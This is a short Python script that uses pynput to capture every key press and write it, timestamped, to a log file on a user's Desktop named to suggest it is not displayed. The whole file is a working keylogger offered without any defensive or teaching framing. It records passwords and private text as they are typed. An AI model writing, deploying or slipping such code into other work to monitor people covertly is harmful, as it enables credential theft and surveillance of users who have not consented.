from pynput.keyboard import Key, Listener
import logging

log_file='/home/bertrand/Desktop/file_no_display.log'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()